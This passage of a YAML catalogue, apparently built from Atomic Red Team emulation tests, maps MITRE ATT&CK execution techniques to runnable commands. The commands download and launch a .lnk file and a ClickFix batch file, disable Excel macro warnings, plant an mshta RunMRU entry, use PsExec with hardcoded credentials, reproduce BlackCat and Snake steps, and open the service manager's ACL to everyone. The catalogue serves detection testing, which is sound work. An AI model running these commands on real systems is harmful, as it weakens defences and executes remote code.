      command: |-
        Invoke-WebRequest -OutFile $env:Temp\test10.lnk "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"
        $file1 = "$env:Temp\test10.lnk"
        Start-Process $file1
        Start-Sleep -s 10
        taskkill /IM a.exe /F
      cleanup: |-
        $file1 = "$env:Temp\test10.lnk"
        $file2 = "$env:Temp\a.exe"
        Remove-Item $file1 -ErrorAction Ignore
        Remove-Item $file2 -ErrorAction Ignore
      timeout: 120
    - name: Mirror Blast Emulation
      type: powershell
      platform: windows
      command: |-
        Cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs"
        New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name "VBAWarnings" -Value "1" -PropertyType DWORD -Force | Out-Null
        & '.\Excel 2016.lnk' "PathToAtomicsFolder\T1204.002\bin\mirrorblast_emulation.xlsm"
      cleanup: reg delete "HKCU\SOFTWARE\Microsoft\Office\16.0\Excel\Security" /v "VBAWarnings" /f
      timeout: 120
    - name: ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell
      type: powershell
      platform: windows
      command: Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -Value '"C:\Windows\System32\mshta.exe" http://localhost/hello6.hta'
      cleanup: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -ErrorAction SilentlyContinue
      timeout: 120
    - name: Simulate Click-Fix via Downloaded BAT File
      type: powershell
      platform: windows
      command: |-
        $url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/click-fix.bat"
        $outfile = "$env:TEMP\click-fix.bat"
        Invoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing
        $process = Start-Process -FilePath $outfile -PassThru -WindowStyle Normal
        $process.Id | Out-File "$env:TEMP\click-fix-pid.txt"
      cleanup: |-
        if (Test-Path "$env:TEMP\click-fix-pid.txt") {
          $pid = Get-Content "$env:TEMP\click-fix-pid.txt"
          Stop-Process -Id $pid -Force -ErrorAction SilentlyContinue
          Remove-Item "$env:TEMP\click-fix-pid.txt" -ErrorAction SilentlyContinue
        }
        Remove-Item "$env:TEMP\click-fix.bat" -ErrorAction SilentlyContinue
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1204/002
  is_safe: false
- id: T1559
  name: Inter-Process Communication
  description: "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through..."
  tactic: execution
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Cobalt Strike Artifact Kit pipe
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 1'
      timeout: 120
    - name: Cobalt Strike Lateral Movement (psexec_psh) pipe
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 2'
      timeout: 120
    - name: Cobalt Strike SSH (postex_ssh) pipe
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 3'
      timeout: 120
    - name: Cobalt Strike post-exploitation pipe (4.2 and later)
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 4'
      timeout: 120
    - name: Cobalt Strike post-exploitation pipe (before 4.2)
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 5'
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1559
  is_safe: false
- id: T1559.002
  name: Dynamic Data Exchange
  description: |-
    Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

    Object Linking and Embedding (OLE), or ...
  tactic: execution
  platforms:
    - windows
  executors:
    - name: Execute PowerShell script via Word DDE
      type: cmd
      platform: windows
      command: start "$PathToAtomicsFolder\T1559.002\bin\DDE_Document.docx"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1559/002
  is_safe: false
- id: T1569.001
  name: Launchctl
  description: |-
    Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)

    Adversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands incl...
  tactic: execution
  platforms:
    - macos
  executors:
    - name: Launchctl
      type: bash
      platform: macos
      command: launchctl submit -l evil -- /System/Applications/Calculator.app/Contents/MacOS/Calculator
      cleanup: launchctl remove evil
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1569/001
  is_safe: false
- id: T1569.002
  name: Service Execution
  description: |-
    Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).

    [PsExec](https://attack.mitre.org/software/S0029) can also b...
  tactic: execution
  platforms:
    - windows
  executors:
    - name: Execute a Command as a Service
      type: cmd
      platform: windows
      command: |-
        sc.exe create ARTService binPath= "%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt"
        sc.exe start ARTService
        sc.exe delete ARTService
      cleanup: del C:\art-marker.txt >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Use PsExec to execute a command on a remote host
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\localhost -i -u DOMAIN\Administrator -p P@ssw0rd1 -accepteula "C:\Windows\System32\calc.exe"'
      timeout: 120
      elevation_required: true
    - name: BlackCat pre-encryption cmds with Lateral Movement
      type: powershell
      platform: windows
      command: "cmd.exe /c \"wmic \tcsproduct \tget UUID\" \ncmd.exe /c \"fsutil behavior \tset SymlinkEvaluation R2L:1\" \ncmd.exe /c \"fsutil behavior set \tSymlinkEvaluation R2R:1\"\nreg    add    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      \ncopy \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" $env:temp\ncmd.exe /c \"$env:temp\\psexec.exe  -accepteula  \\\\$ENV:COMPUTERNAME cmd.exe  /c echo \"--access-token\"\""
      cleanup: "reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v MaxMpxCt /f\ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2L:0\" \ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2R:0\"\nrm $env:temp\\psexec.exe"
      timeout: 120
      elevation_required: true
    - name: Use RemCom to execute a command on a remote host
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\remcom.exe" \\localhost /user:Administrator /pwd:P@ssw0rd1 cmd.exe'
      timeout: 120
    - name: Snake Malware Service Create
      type: cmd
      platform: windows
      command: sc.exe create "WerFaultSvc" binPath= "$env:windir\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe" DisplayName= "WerFault Service" start= auto
      cleanup: sc.exe delete "WerFaultSvc"
      timeout: 120
      elevation_required: true
    - name: Modifying ACL of Service Control Manager via SDET
      type: cmd
      platform: windows
      command: sc.exe sdset scmanager D:(A;;KA;;;WD)
      timeout: 120
      elevation_required: true
    - name: Pipe Creation - PsExec Tool Execution From Suspicious Locations
      type: powershell
      platform: windows
      command: "cd C:\\Users\\Public\\Temp\\ \n.\\PsExec.exe -i -s cmd  -accepteula"
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1569/002
  is_safe: false
